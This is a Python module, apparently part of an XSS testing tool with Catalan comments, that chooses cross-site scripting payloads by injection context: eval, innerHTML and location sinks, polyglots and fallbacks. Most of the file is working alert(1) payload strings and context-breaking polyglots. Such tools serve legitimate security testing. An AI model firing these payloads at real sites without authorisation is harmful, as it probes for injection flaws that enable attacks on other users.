from typing import List
from xss_tester.core.models import Payload, InjectionPoint


class PayloadEngine:
    """
    Selecciona payloads en funció del context detectat
    """

    def select(self, payloads: List[Payload], point: InjectionPoint) -> List[Payload]:
        selected = []

        # 1. Payloads estàtics del fitxer YAML (filtrats per context)
        for payload in payloads:
            if payload.expected_context and payload.expected_context != point.context:
                continue
            if payload.expected_subcontext and payload.expected_subcontext != point.subcontext:
                continue
            selected.append(payload)

        # 2. Payloads dinàmics generats per sinks específics
        custom_payloads = self._generate_sink_specific_payloads(point)

        # 3. Polyglots: Si el context és desconegut o ambigu
        polyglots = []
        if point.context in ["unknown", None] or not selected:
            polyglots = self._generate_polyglots()

        # Prioritzem: Sinks > Polyglots > Context-Specific
        return custom_payloads + polyglots + selected

    def _generate_sink_specific_payloads(self, point: InjectionPoint) -> List[Payload]:
        """
        Genera payloads on-the-fly basats en el sink detectat (subcontext)
        """
        payloads = []
        sub = point.subcontext or ""

        # 1. Eval / Script execution sinks (Pure JS)
        if sub == "js_eval" or "eval" in sub or "setTimeout" in sub or "setInterval" in sub:
            payloads.extend([
                Payload(value="alert(1)", category="sink_specific"),
                Payload(value="alert(1)//", category="sink_specific"),
                Payload(value=";alert(1);//", category="sink_specific"),
                Payload(value="';alert(1);//", category="sink_specific"),
                Payload(value="\";alert(1);//", category="sink_specific"),
                Payload(value="-alert(1)-", category="sink_specific"),
            ])

        # 2. HTML Injection sinks (innerHTML, etc.)
        elif "innerHTML" in sub or "outerHTML" in sub or "document.write" in sub:
            payloads.extend([
                Payload(value="<img src=x onerror=alert(1)>", category="sink_specific"),
                Payload(value="<svg/onload=alert(1)>", category="sink_specific"),
                Payload(value="<iframe/onload=alert(1)>", category="sink_specific"),
                Payload(value="<script>alert(1)</script>", category="sink_specific"),
            ])

        # 3. URL/Location sinks
        elif "location" in sub or "navigation" in sub:
            payloads.extend([
                Payload(value="javascript:alert(1)", category="sink_specific"),
                Payload(value="javascript://%250Aalert(1)", category="sink_specific"),
            ])

        return payloads

    def _generate_polyglots(self) -> List[Payload]:
        """
        Genera payloads 'polyglot' capaços de trencar múltiples contextos
        (HTML, atributs, JS string, etc.) simultàniament.
        """
        return [
            Payload(
                value="javascript://%250Aalert(1)//\"/*\\'/*`/*--></title></textarea></style></noscript></script>*/<svg/onload=alert(1)>",
                category="polyglot"
            ),
            Payload(
                value="\"`'><script>alert(1)</script>",
                category="polyglot"
            ),
            Payload(
                value="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                category="polyglot"
            )
        ]

    def fallback(self, point: InjectionPoint) -> List[Payload]:
        """
        Payloads genèrics si no tenim context clar
        """
        return [
            Payload(value="<script>alert(1)</script>", category="xss"),
            Payload(value='"><svg/onload=alert(1)>', category="xss"),
            Payload(value="<img src=x onerror=alert(1)>", category="xss"),
        ]
